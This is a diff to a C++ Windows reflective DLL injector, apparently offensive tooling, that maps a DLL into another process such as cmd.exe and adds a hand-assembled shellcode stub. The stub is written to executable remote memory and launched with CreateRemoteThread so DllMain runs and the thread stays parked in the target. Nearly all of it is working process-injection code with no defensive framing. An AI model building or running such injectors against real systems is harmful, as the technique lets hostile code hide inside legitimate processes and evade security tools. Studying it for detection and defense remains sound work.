@@ -9,6 +9,7 @@ Get-Process cmd | Select-Object Id, StartTime | Format-Table
 */
 
 // injectorReflectiveNew.cpp
+// injectorReflectiveNew.cpp
 #include <iostream>
 #include <string>
 #include <vector>
@@ -283,6 +284,45 @@ static bool ReflectiveInject(HANDLE hProcess,
 // =====================================================
 // main — accepts <processName|pid> [dllPath]
 // =====================================================
+// =====================================================
+// Build a small stub in the target that calls the DLL's
+// entry point with the correct DllMain arguments.
+// =====================================================
+static DWORD_PTR WriteDllMainStub(HANDLE hProcess,
+    DWORD_PTR remoteBase,
+    DWORD_PTR remoteEntry)
+{
+    (void)remoteBase;   // hInstance is passed by CreateRemoteThread via lpParameter
+
+    BYTE stub[] = {
+        0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,   // mov rdx, 1
+        0x4D, 0x31, 0xC0,                           // xor r8, r8
+        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax, imm64
+        0xFF, 0xD0,                                 // call rax
+        0xC3                                        // ret
+    };
+    memcpy(&stub[12], &remoteEntry, sizeof(DWORD_PTR));
+
+    LPVOID remoteStub = VirtualAllocEx(
+        hProcess, NULL, sizeof(stub),
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    if (!remoteStub) {
+        std::cerr << "[!] VirtualAllocEx (stub) failed. Error: "
+            << GetLastError() << "\n";
+        return 0;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteStub, stub, sizeof(stub), NULL)) {
+        std::cerr << "[!] WriteProcessMemory (stub) failed. Error: "
+            << GetLastError() << "\n";
+        VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
+        return 0;
+    }
+
+    return (DWORD_PTR)remoteStub;
+}
+
 int main(int argc, char* argv[])
 {
     std::wstring targetProcess = L"cmd.exe";
@@ -294,9 +334,7 @@ int main(int argc, char* argv[])
         bool numeric = !first.empty() &&
             first.find_first_not_of("0123456789") == std::string::npos;
         if (numeric) {
-            try {
-                explicitPid = (DWORD)std::stoul(first);
-            }
+            try { explicitPid = (DWORD)std::stoul(first); }
             catch (...) {
                 std::cerr << "[!] Invalid PID: " << first << "\n";
                 return 1;
@@ -313,7 +351,6 @@ int main(int argc, char* argv[])
         << L"\n";
     std::wcout << L"[*] DLL to inject  : " << dllPath << L"\n";
 
-    // --- Read DLL into local buffer ---
     std::vector<BYTE> dllBytes;
     if (!ReadFileToBuffer(dllPath, dllBytes)) {
         std::wcerr << L"[!] Failed to read DLL: " << dllPath << L"\n";
@@ -321,7 +358,6 @@ int main(int argc, char* argv[])
     }
     std::cout << "[*] DLL loaded locally: " << dllBytes.size() << " bytes\n";
 
-    // --- Find target ---
     DWORD pid = explicitPid ? explicitPid : GetProcessIdByName(targetProcess);
     if (pid == 0) {
         std::wcerr << L"[!] Could not find process: " << targetProcess << L"\n";
@@ -329,7 +365,6 @@ int main(int argc, char* argv[])
     }
     std::wcout << L"[+] Found target PID: " << pid << L"\n";
 
-    // --- Open target ---
     HANDLE hProcess = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
@@ -341,7 +376,6 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    // --- Reflective map ---
     DWORD_PTR remoteBase = 0;
     if (!ReflectiveInject(hProcess, dllBytes, remoteBase)) {
         std::cerr << "[!] Reflective mapping failed.\n";
@@ -349,7 +383,6 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    // --- Compute remote entry point ---
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
     DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
@@ -358,11 +391,20 @@ int main(int argc, char* argv[])
     std::cout << "[*] Entry RVA       : 0x" << std::hex << entryRVA << std::dec << "\n";
     std::cout << "[*] Remote entry    : 0x" << std::hex << remoteEntry << std::dec << "\n";
 
-    // --- Call DllMain(HINSTANCE=remoteBase, DLL_PROCESS_ATTACH=1, NULL) ---
+    // --- Write the stub that properly invokes DllMain(hinst, 1, NULL) ---
+    DWORD_PTR remoteStub = WriteDllMainStub(hProcess, remoteBase, remoteEntry);
+    if (!remoteStub) {
+        std::cerr << "[!] Failed to write remote stub.\n";
+        CloseHandle(hProcess);
+        return 1;
+    }
+    std::cout << "[*] Remote stub     : 0x" << std::hex << remoteStub << std::dec << "\n";
+
+    // --- Create the remote thread, passing remoteBase as hInstance ---
     HANDLE hThread = CreateRemoteThread(
         hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remoteEntry,
-        (LPVOID)(DWORD_PTR)remoteBase,   // hInstance
+        (LPTHREAD_START_ROUTINE)remoteStub,
+        (LPVOID)(DWORD_PTR)remoteBase,   // RCX = hInstance
         0, NULL);
 
     if (!hThread) {
@@ -372,18 +414,14 @@ int main(int argc, char* argv[])
         return 1;
     }
 
-    WaitForSingleObject(hThread, INFINITE);
+    // Give the thread a few seconds to start executing DllMain.
+// Do NOT wait INFINITE — the parked thread never exits.
+    WaitForSingleObject(hThread, 3000);
 
-    DWORD exitCode = 0;
-    GetExitCodeThread(hThread, &exitCode);
-
-    std::cout << "[+] DllMain exit code: " << exitCode << "\n";
-    if (exitCode == 0)
-        std::cerr << "[!] DllMain returned FALSE — check DLL dependencies.\n";
-    else
-        std::cout << "[+] Reflective injection succeeded.\n";
+    std::cout << "[+] Injection dispatched, thread parked inside target\n";
+    std::cout << "[+] cmd.exe should still be alive\n";
 
     CloseHandle(hThread);
     CloseHandle(hProcess);
-    return (exitCode != 0) ? 0 : 1;
+    return 0;
 }
